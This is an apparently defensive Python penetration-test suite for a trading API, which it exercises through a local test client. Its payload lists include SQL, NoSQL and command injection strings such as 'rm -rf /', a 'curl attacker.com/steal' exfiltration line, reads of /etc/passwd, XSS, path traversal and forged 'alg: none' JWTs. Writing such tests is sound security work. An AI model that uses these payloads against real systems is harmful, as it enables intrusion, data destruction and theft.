"""
Comprehensive Security Penetration Testing Suite
Simulates real-world attacks against the Tactical MARL System
"""

import asyncio
import json
import pytest
import time
import jwt
import hashlib
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch

import requests
from fastapi.testclient import TestClient
from fastapi import FastAPI

# Import the application under test
import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent.parent))

from src.api.tactical_main import app
from src.security.auth import JWTAuth, Permission, Role
from src.security.attack_detection import ThreatMonitor, SecurityAnalyzer, AttackType


class SecurityTestConfig:
    """Configuration for security tests."""
    
    # Test targets
    BASE_URL = "http://localhost:8001"
    TEST_ENDPOINTS = [
        "/health",
        "/health/state", 
        "/metrics",
        "/decide",
        "/status",
        "/performance"
    ]
    
    # Attack payloads
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM information_schema.tables --",
        "1; EXEC sp_configure 'show advanced options', 1--",
        "admin'--",
        "' OR 1=1#",
        "'; WAITFOR DELAY '00:00:10'--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='M'--"
    ]
    
    NOSQL_INJECTION_PAYLOADS = [
        '{"$where": "function() { return true; }"}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$gt": ""}',
        '{"user": {"$ne": "admin"}}',
        '{"$eval": "db.collection.drop()"}',
        '{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}'
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`id`",
        "; netstat -an",
        "|| curl attacker.com/steal"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<input type=text value='' onfocus=alert('XSS') autofocus>"
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ]
    
    JWT_MANIPULATION_PAYLOADS = [
        # None algorithm attack
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
        # Malformed JWT
        'invalid.jwt.token',
        # Missing signature
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ',
        # Empty signature
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.',
    ]


class SecurityTestHarness:
    """Main security testing harness for penetration testing."""
    
    def __init__(self):
        self.client = TestClient(app)
        self.config = SecurityTestConfig()
        self.vulnerabilities = []
        self.test_results = {}
        
    def generate_random_string(self, length: int = 10) -> str:
        """Generate random string for fuzzing."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def create_malicious_matrix(self) -> List[List[float]]:
        """Create malicious matrix data for decision endpoint testing."""
        matrix = []
        for i in range(60):
            row = []
            for j in range(7):
                # Mix normal and malicious values
                if random.random() < 0.1:  # 10% chance of malicious value
                    # Inject extreme values that might cause overflow
                    row.append(float('inf') if random.random() < 0.5 else -float('inf'))
                else:
                    row.append(random.uniform(-1000, 1000))
            matrix.append(row)
        return matrix
    
    def record_vulnerability(self, test_name: str, severity: str, description: str, 
                           cvss_score: float, exploitation_proof: str):
        """Record a discovered vulnerability."""
        vulnerability = {
            "test_name": test_name,
            "severity": severity,
            "cvss_score": cvss_score,
            "description": description,
            "exploitation_proof": exploitation_proof,
            "timestamp": datetime.utcnow().isoformat(),
            "remediation": self._get_remediation_advice(test_name)
        }
        self.vulnerabilities.append(vulnerability)
    
    def _get_remediation_advice(self, test_name: str) -> str:
        """Get remediation advice for specific vulnerability types."""
        advice_map = {
            "sql_injection": "Implement parameterized queries and input validation",
            "nosql_injection": "Validate and sanitize all NoSQL queries",
            "command_injection": "Never execute user input as system commands",
            "xss": "Implement proper input/output encoding and CSP headers",
            "path_traversal": "Validate file paths and use secure file access methods",
            "auth_bypass": "Implement proper authentication checks on all endpoints",
            "jwt_manipulation": "Validate JWT signature and algorithm properly",
            "rate_limiting": "Implement proper rate limiting mechanisms",
            "cors_misconfiguration": "Configure CORS with specific allowed origins"
        }
        
        for key, advice in advice_map.items():
            if key in test_name.lower():
                return advice
        
        return "Review and harden the affected component"


class AuthenticationTests(SecurityTestHarness):
    """Test authentication and authorization security."""
    
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities."""
        print("\n🔍 Testing Authentication Bypass...")
        
        # Test 1: Access protected endpoints without authentication
        protected_endpoints = ["/decide", "/performance"]
        
        for endpoint in protected_endpoints:
            response = self.client.post(endpoint, json={})
            
            # If we get anything other than 401/403, it's a vulnerability
            if response.status_code not in [401, 403]:
                self.record_vulnerability(
                    "auth_bypass_no_token",
                    "CRITICAL",
                    f"Endpoint {endpoint} accessible without authentication",
                    9.8,
                    f"curl -X POST {self.config.BASE_URL}{endpoint} -d '{{}}'"
                )
        
        # Test 2: Invalid JWT tokens
        invalid_tokens = [
            "invalid_token",
            "",
            "Bearer ",
            "Bearer invalid.jwt.token",
            "Bearer " + "A" * 500  # Oversized token
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": token}
            response = self.client.post("/decide", headers=headers, json={
                "matrix_state": [[1.0] * 7] * 60,
                "correlation_id": "test"
            })
            
            # Should always return 401/403 for invalid tokens
            if response.status_code not in [401, 403]:
                self.record_vulnerability(
                    "auth_bypass_invalid_token",
                    "HIGH",
                    f"Invalid token '{token[:20]}...' was accepted",
                    8.5,
                    f"curl -X POST {self.config.BASE_URL}/decide -H 'Authorization: {token}'"
                )
    
    def test_jwt_manipulation(self):
        """Test JWT token manipulation attacks."""
        print("🔍 Testing JWT Manipulation...")
        
        # Create a valid JWT for testing
        jwt_auth = JWTAuth()
        valid_token = jwt_auth.create_token("test_user", "admin", ["read", "write", "trade"])
        
        # Test 1: Algorithm confusion attack (alg: none)
        none_header = json.dumps({"typ": "JWT", "alg": "none"})
        none_payload = json.dumps({"user_id": "admin", "permissions": ["admin"]})
        
        import base64
        none_token = base64.urlsafe_b64encode(none_header.encode()).decode().rstrip('=') + '.' + \
                     base64.urlsafe_b64encode(none_payload.encode()).decode().rstrip('=') + '.'
        
        headers = {"Authorization": f"Bearer {none_token}"}
        response = self.client.post("/decide", headers=headers, json={
            "matrix_state": [[1.0] * 7] * 60,
            "correlation_id": "test"
        })
        
        if response.status_code not in [401, 403]:
            self.record_vulnerability(
                "jwt_none_algorithm",
                "CRITICAL",
                "JWT 'none' algorithm attack successful",
                9.5,
                f"None algorithm JWT: {none_token}"
            )
        
        # Test 2: Signature manipulation
        try:
            # Take valid token and modify the signature
            parts = valid_token.split('.')
            if len(parts) == 3:
                # Modify last character of signature
                modified_sig = parts[2][:-1] + ('A' if parts[2][-1] != 'A' else 'B')
                modified_token = f"{parts[0]}.{parts[1]}.{modified_sig}"
                
                headers = {"Authorization": f"Bearer {modified_token}"}
                response = self.client.post("/decide", headers=headers, json={
                    "matrix_state": [[1.0] * 7] * 60,
                    "correlation_id": "test"
                })
                
                if response.status_code not in [401, 403]:
                    self.record_vulnerability(
                        "jwt_signature_bypass",
                        "CRITICAL",
                        "Modified JWT signature was accepted",
                        9.8,
                        f"Modified JWT: {modified_token}"
                    )
        except Exception as e:
            print(f"JWT manipulation test error: {e}")
    
    def test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities."""
        print("🔍 Testing Privilege Escalation...")
        
        # Create tokens with different privilege levels
        jwt_auth = JWTAuth()
        
        # Low privilege token (read-only)
        low_priv_token = jwt_auth.create_token("user", "viewer", ["read"])
        
        # Try to access admin functions with low privilege token
        headers = {"Authorization": f"Bearer {low_priv_token}"}
        
        # Test accessing trading endpoint (should require 'trade' permission)
        response = self.client.post("/decide", headers=headers, json={
            "matrix_state": [[1.0] * 7] * 60,
            "correlation_id": "test"
        })
        
        if response.status_code == 200:
            self.record_vulnerability(
                "privilege_escalation",
                "HIGH",
                "Low-privilege user can access trading functionality",
                8.1,
                f"Low privilege token accessing /decide: {low_priv_token}"
            )


class InputValidationTests(SecurityTestHarness):
    """Test input validation and injection vulnerabilities."""
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities."""
        print("🔍 Testing SQL Injection...")
        
        for payload in self.config.SQL_INJECTION_PAYLOADS:
            # Test in various input fields
            test_requests = [
                {"correlation_id": payload},
                {"synergy_context": {"synergy_type": payload}},
                {"override_params": {"key": payload}}
            ]
            
            for req_data in test_requests:
                req_data.update({
                    "matrix_state": [[1.0] * 7] * 60,
                    "correlation_id": req_data.get("correlation_id", "test")
                })
                
                try:
                    response = self.client.post("/decide", json=req_data)
                    
                    # Look for SQL error messages or unexpected behavior
                    if response.status_code == 500 or \
                       any(keyword in response.text.lower() for keyword in 
                           ['sql', 'database', 'mysql', 'postgres', 'sqlite', 'oracle']):
                        self.record_vulnerability(
                            "sql_injection_vulnerability",
                            "CRITICAL",
                            f"SQL injection payload triggered database error: {payload}",
                            9.9,
                            f"POST /decide with payload: {json.dumps(req_data)}"
                        )
                except Exception as e:
                    if any(keyword in str(e).lower() for keyword in ['sql', 'database']):
                        self.record_vulnerability(
                            "sql_injection_exception",
                            "HIGH",
                            f"SQL injection payload caused exception: {payload}",
                            8.7,
                            f"Exception: {str(e)}"
                        )
    
    def test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities."""
        print("🔍 Testing NoSQL Injection...")
        
        for payload_str in self.config.NOSQL_INJECTION_PAYLOADS:
            try:
                payload = json.loads(payload_str)
            except (ConnectionError, OSError, TimeoutError) as e:
                payload = payload_str
            
            test_requests = [
                {"correlation_id": payload},
                {"override_params": payload if isinstance(payload, dict) else {"key": payload}},
                {"synergy_context": {"market_context": payload}}
            ]
            
            for req_data in test_requests:
                req_data.update({
                    "matrix_state": [[1.0] * 7] * 60,
                    "correlation_id": req_data.get("correlation_id", "test")
                })
                
                try:
                    response = self.client.post("/decide", json=req_data)
                    
                    # Check for Redis/NoSQL error indicators
                    if response.status_code == 500 or \
                       any(keyword in response.text.lower() for keyword in 
                           ['redis', 'mongodb', 'nosql', 'eval', 'where']):
                        self.record_vulnerability(
                            "nosql_injection_vulnerability",
                            "HIGH",
                            f"NoSQL injection payload triggered error: {payload}",
                            8.5,
                            f"POST /decide with payload: {json.dumps(req_data)}"
                        )
                except Exception as e:
                    if any(keyword in str(e).lower() for keyword in ['redis', 'mongodb']):
                        self.record_vulnerability(
                            "nosql_injection_exception",
                            "MEDIUM",
                            f"NoSQL injection payload caused exception: {payload}",
                            7.5,
                            f"Exception: {str(e)}"
                        )
    
    def test_command_injection(self):
        """Test for command injection vulnerabilities."""
        print("🔍 Testing Command Injection...")
        
        for payload in self.config.COMMAND_INJECTION_PAYLOADS:
            test_requests = [
                {"correlation_id": payload},
                {"override_params": {"command": payload}},
                {"synergy_context": {"synergy_type": payload}}
            ]
            
            for req_data in test_requests:
                req_data.update({
                    "matrix_state": [[1.0] * 7] * 60,
                    "correlation_id": req_data.get("correlation_id", "test")
                })
                
                try:
                    start_time = time.time()
                    response = self.client.post("/decide", json=req_data)
                    response_time = time.time() - start_time
                    
                    # Check for command execution indicators
                    if response_time > 10:  # Unusually long response time
                        self.record_vulnerability(
                            "command_injection_delay",
                            "CRITICAL",
                            f"Command injection may have caused delay: {payload}",
                            9.0,
                            f"Response time: {response_time}s with payload: {payload}"
                        )
                    
                    # Check for system information in response
                    if any(keyword in response.text.lower() for keyword in 
                           ['root:', 'uid=', 'gid=', 'kernel', 'linux', 'windows']):
                        self.record_vulnerability(
                            "command_injection_info_disclosure",
                            "CRITICAL",
                            f"Command injection revealed system information: {payload}",
                            9.5,
                            f"Response contained system info: {response.text[:200]}"
                        )
                except Exception as e:
                    if 'command' in str(e).lower() or 'system' in str(e).lower():
                        self.record_vulnerability(
                            "command_injection_exception",
                            "HIGH",
                            f"Command injection payload caused system exception: {payload}",
                            8.5,
                            f"Exception: {str(e)}"
                        )


class NetworkSecurityTests(SecurityTestHarness):
    """Test network security configurations."""
    
    def test_cors_configuration(self):
        """Test CORS security configuration."""
        print("🔍 Testing CORS Configuration...")
        
        # Test dangerous CORS origins
        dangerous_origins = [
            "https://evil.com",
            "http://localhost:3000",  # Common dev server
            "null",
            "*"
        ]
        
        for origin in dangerous_origins:
            headers = {"Origin": origin}
            response = self.client.get("/health", headers=headers)
            
            cors_header = response.headers.get("access-control-allow-origin")
            if cors_header == "*" or cors_header == origin:
                severity = "HIGH" if origin in ["*", "null"] else "MEDIUM"
                self.record_vulnerability(
                    "cors_misconfiguration",
                    severity,
                    f"CORS allows potentially dangerous origin: {origin}",
                    7.5 if severity == "HIGH" else 5.5,
                    f"Origin: {origin} was allowed"
                )
    
    def test_ssl_configuration(self):
        """Test SSL/TLS configuration."""
        print("🔍 Testing SSL Configuration...")
        
        # In a real test, you would check:
        # - TLS version support
        # - Cipher suite strength
        # - Certificate validation
        # - HSTS headers
        
        # Test for security headers
        response = self.client.get("/health")
        
        security_headers = [
            "strict-transport-security",
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection",
            "content-security-policy"
        ]
        
        missing_headers = []
        for header in security_headers:
            if header not in response.headers:
                missing_headers.append(header)
        
        if missing_headers:
            self.record_vulnerability(
                "missing_security_headers",
                "MEDIUM",
                f"Missing security headers: {', '.join(missing_headers)}",
                6.5,
                f"Response headers: {dict(response.headers)}"
            )
    
    def test_rate_limiting(self):
        """Test rate limiting effectiveness."""
        print("🔍 Testing Rate Limiting...")
        
        # Test burst requests
        responses = []
        for i in range(150):  # Exceed typical rate limit
            response = self.client.get("/health")
            responses.append(response.status_code)
        
        # Check if any requests were rate limited
        rate_limited = any(status == 429 for status in responses)
        
        if not rate_limited:
            self.record_vulnerability(
                "insufficient_rate_limiting",
                "MEDIUM",
                "No rate limiting detected after 150 rapid requests",
                6.0,
                f"All {len(responses)} requests succeeded"
            )


class DataSecurityTests(SecurityTestHarness):
    """Test data security and encryption."""
    
    def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure."""
        print("🔍 Testing Sensitive Data Exposure...")
        
        # Test error messages for information disclosure
        malformed_requests = [
            {"matrix_state": "not_a_list"},
            {"matrix_state": [[1] * 8] * 60},  # Wrong dimensions
            {"correlation_id": None},
            {"synergy_context": {"invalid": "structure"}}
        ]
        
        for req_data in malformed_requests:
            response = self.client.post("/decide", json=req_data)
            
            # Check for sensitive information in error messages
            sensitive_patterns = [
                r'/home/\w+/',  # File paths
                r'password|secret|key',  # Credentials
                r'redis://|postgres://',  # Connection strings
                r'192\.168\.|10\.|172\.',  # Internal IP addresses
                r'stacktrace|traceback',  # Debug information
            ]
            
            import re
            for pattern in sensitive_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    self.record_vulnerability(
                        "sensitive_data_exposure",
                        "MEDIUM",
                        f"Error message contains sensitive information: {pattern}",
                        7.0,
                        f"Response: {response.text[:300]}"
                    )
    
    def test_model_security(self):
        """Test ML model security."""
        print("🔍 Testing Model Security...")
        
        # Test model poisoning attempts
        poisoned_matrix = self.create_malicious_matrix()
        
        response = self.client.post("/decide", json={
            "matrix_state": poisoned_matrix,
            "correlation_id": "model_poison_test"
        })
        
        # Check if malicious values cause issues
        if response.status_code == 500:
            self.record_vulnerability(
                "model_poisoning_vulnerability",
                "HIGH",
                "Model failed when processing malicious input data",
                8.0,
                f"Poisoned matrix caused server error"
            )
        
        # Test extremely large values that might cause overflow
        extreme_matrix = [[[float('1e308')] * 7] * 60]  # Very large numbers
        
        try:
            response = self.client.post("/decide", json={
                "matrix_state": extreme_matrix[0],
                "correlation_id": "overflow_test"
            })
        except Exception as e:
            if 'overflow' in str(e).lower():
                self.record_vulnerability(
                    "numeric_overflow",
                    "MEDIUM",
                    "Model vulnerable to numeric overflow attacks",
                    6.5,
                    f"Overflow exception: {str(e)}"
                )


class FinancialSecurityTests(SecurityTestHarness):
    """Test financial fraud and trading security."""
    
    def test_trading_manipulation(self):
        """Test for trading decision manipulation."""
        print("🔍 Testing Trading Manipulation...")
        
        # Test unrealistic trading parameters
        manipulation_tests = [
            {
                "matrix_state": [[1000000.0] * 7] * 60,  # Unrealistic market values
                "override_params": {"bypass_risk": True},
                "correlation_id": "manipulation_test_1"
            },
            {
                "matrix_state": [[float('inf')] * 7] * 60,  # Infinite values
                "override_params": {"force_execute": True},
                "correlation_id": "manipulation_test_2"
            },
            {
                "matrix_state": [[0.0] * 7] * 60,
                "override_params": {"admin_override": True, "disable_limits": True},
                "correlation_id": "'; DROP TABLE positions; --"  # SQL injection in correlation ID
            }
        ]
        
        for test_data in manipulation_tests:
            response = self.client.post("/decide", json=test_data)
            
            # Check if manipulation was successful
            if response.status_code == 200:
                decision = response.json()
                
                # Check for suspicious decision outputs
                if decision.get("decision", {}).get("action") == "execute":
                    self.record_vulnerability(
                        "trading_manipulation",
                        "CRITICAL",
                        "Trading system accepted manipulated input and made trading decision",
                        9.8,
                        f"Manipulation successful: {json.dumps(test_data)}"
                    )
    
    def test_financial_limits_bypass(self):
        """Test financial risk limits bypass."""
        print("🔍 Testing Financial Limits Bypass...")
        
        # Test attempts to bypass financial safeguards
        bypass_attempts = [
            {"override_params": {"max_position_size": 1000000}},
            {"override_params": {"risk_multiplier": 100}},
            {"override_params": {"emergency_stop": False}},
            {"override_params": {"kelly_override": 999}}
        ]
        
        for attempt in bypass_attempts:
            attempt.update({
                "matrix_state": [[1.0] * 7] * 60,
                "correlation_id": "limit_bypass_test"
            })
            
            response = self.client.post("/decide", json=attempt)
            
            if response.status_code == 200:
                self.record_vulnerability(
                    "financial_limits_bypass",
                    "CRITICAL",
                    f"Financial limits bypass successful: {attempt['override_params']}",
                    9.5,
                    f"Bypass parameters accepted: {json.dumps(attempt)}"
                )


class SecurityTestSuite:
    """Main security test suite coordinator."""
    
    def __init__(self):
        self.test_classes = [
            AuthenticationTests(),
            InputValidationTests(),
            NetworkSecurityTests(),
            DataSecurityTests(),
            FinancialSecurityTests()
        ]
        self.all_vulnerabilities = []
    
    def run_all_tests(self):
        """Run all security tests."""
        print("🔒 Starting Comprehensive Security Penetration Testing")
        print("=" * 60)
        
        for test_class in self.test_classes:
            print(f"\n🧪 Running {test_class.__class__.__name__}")
            
            # Get all test methods
            test_methods = [method for method in dir(test_class) if method.startswith('test_')]
            
            for method_name in test_methods:
                try:
                    method = getattr(test_class, method_name)
                    method()
                except Exception as e:
                    print(f"❌ Test {method_name} failed with error: {e}")
            
            # Collect vulnerabilities
            self.all_vulnerabilities.extend(test_class.vulnerabilities)
        
        return self.generate_security_report()
    
    def generate_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive security report."""
        # Sort vulnerabilities by CVSS score
        sorted_vulns = sorted(self.all_vulnerabilities, key=lambda x: x['cvss_score'], reverse=True)
        
        severity_counts = {
            "CRITICAL": len([v for v in sorted_vulns if v['severity'] == 'CRITICAL']),
            "HIGH": len([v for v in sorted_vulns if v['severity'] == 'HIGH']),
            "MEDIUM": len([v for v in sorted_vulns if v['severity'] == 'MEDIUM']),
            "LOW": len([v for v in sorted_vulns if v['severity'] == 'LOW'])
        }
        
        # Calculate overall risk score
        total_cvss = sum(v['cvss_score'] for v in sorted_vulns)
        avg_cvss = total_cvss / len(sorted_vulns) if sorted_vulns else 0
        
        report = {
            "summary": {
                "total_vulnerabilities": len(sorted_vulns),
                "severity_breakdown": severity_counts,
                "average_cvss_score": round(avg_cvss, 2),
                "highest_cvss_score": max(v['cvss_score'] for v in sorted_vulns) if sorted_vulns else 0,
                "overall_risk_level": self._calculate_risk_level(severity_counts),
                "test_timestamp": datetime.utcnow().isoformat()
            },
            "vulnerabilities": sorted_vulns,
            "recommendations": self._generate_recommendations(sorted_vulns),
            "compliance_status": self._assess_compliance(sorted_vulns)
        }
        
        return report
    
    def _calculate_risk_level(self, severity_counts: Dict[str, int]) -> str:
        """Calculate overall risk level."""
        if severity_counts["CRITICAL"] > 0:
            return "CRITICAL"
        elif severity_counts["HIGH"] > 3:
            return "HIGH"
        elif severity_counts["MEDIUM"] > 5:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Generate security recommendations."""
        recommendations = [
            "Implement comprehensive input validation on all endpoints",
            "Add proper authentication and authorization checks",
            "Configure security headers and CORS policies",
            "Implement rate limiting and DDoS protection",
            "Add monitoring and alerting for security events",
            "Regular security audits and penetration testing",
            "Implement secure coding practices",
            "Add encryption for sensitive data",
            "Configure proper error handling to prevent information disclosure",
            "Implement financial fraud detection mechanisms"
        ]
        
        # Add specific recommendations based on found vulnerabilities
        vuln_types = set(v['test_name'] for v in vulnerabilities)
        
        specific_recommendations = {
            'sql_injection': "Implement parameterized queries and ORM usage",
            'auth_bypass': "Strengthen authentication middleware",
            'cors_misconfiguration': "Configure CORS with specific allowed origins",
            'trading_manipulation': "Implement robust financial validation and limits"
        }
        
        for vuln_type, recommendation in specific_recommendations.items():
            if any(vuln_type in vt for vt in vuln_types):
                recommendations.append(recommendation)
        
        return recommendations[:10]  # Top 10 recommendations
    
    def _assess_compliance(self, vulnerabilities: List[Dict]) -> Dict[str, str]:
        """Assess compliance with security standards."""
        critical_count = len([v for v in vulnerabilities if v['severity'] == 'CRITICAL'])
        high_count = len([v for v in vulnerabilities if v['severity'] == 'HIGH'])
        
        return {
            "PCI_DSS": "NON_COMPLIANT" if critical_count > 0 else "REVIEW_REQUIRED",
            "SOX": "NON_COMPLIANT" if any("financial" in v['test_name'] for v in vulnerabilities) else "COMPLIANT",
            "GDPR": "REVIEW_REQUIRED" if any("data" in v['test_name'] for v in vulnerabilities) else "COMPLIANT",
            "ISO27001": "NON_COMPLIANT" if critical_count > 0 or high_count > 3 else "COMPLIANT"
        }


# Test execution functions
def test_authentication_security():
    """Test authentication security."""
    tests = AuthenticationTests()
    tests.test_authentication_bypass()
    tests.test_jwt_manipulation()
    tests.test_privilege_escalation()
    return tests.vulnerabilities


def test_input_validation_security():
    """Test input validation security."""
    tests = InputValidationTests()
    tests.test_sql_injection()
    tests.test_nosql_injection()
    tests.test_command_injection()
    return tests.vulnerabilities


def test_network_security():
    """Test network security."""
    tests = NetworkSecurityTests()
    tests.test_cors_configuration()
    tests.test_ssl_configuration()
    tests.test_rate_limiting()
    return tests.vulnerabilities


def test_data_security():
    """Test data security."""
    tests = DataSecurityTests()
    tests.test_sensitive_data_exposure()
    tests.test_model_security()
    return tests.vulnerabilities


def test_financial_security():
    """Test financial security."""
    tests = FinancialSecurityTests()
    tests.test_trading_manipulation()
    tests.test_financial_limits_bypass()
    return tests.vulnerabilities


def run_full_penetration_test():
    """Run complete penetration testing suite."""
    suite = SecurityTestSuite()
    return suite.run_all_tests()


if __name__ == "__main__":
    # Run the complete security test suite
    report = run_full_penetration_test()
    
    # Print summary
    print("\n" + "=" * 60)
    print("🔒 SECURITY PENETRATION TEST RESULTS")
    print("=" * 60)
    print(f"Total Vulnerabilities Found: {report['summary']['total_vulnerabilities']}")
    print(f"Overall Risk Level: {report['summary']['overall_risk_level']}")
    print(f"Average CVSS Score: {report['summary']['average_cvss_score']}")
    
    print("\nSeverity Breakdown:")
    for severity, count in report['summary']['severity_breakdown'].items():
        print(f"  {severity}: {count}")
    
    if report['vulnerabilities']:
        print(f"\nTop 5 Critical Vulnerabilities:")
        for i, vuln in enumerate(report['vulnerabilities'][:5]):
            print(f"  {i+1}. {vuln['description']} (CVSS: {vuln['cvss_score']})")
    
    # Save detailed report
    with open("/home/QuantNova/GrandModel/security_penetration_test_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"\nDetailed report saved to: security_penetration_test_report.json")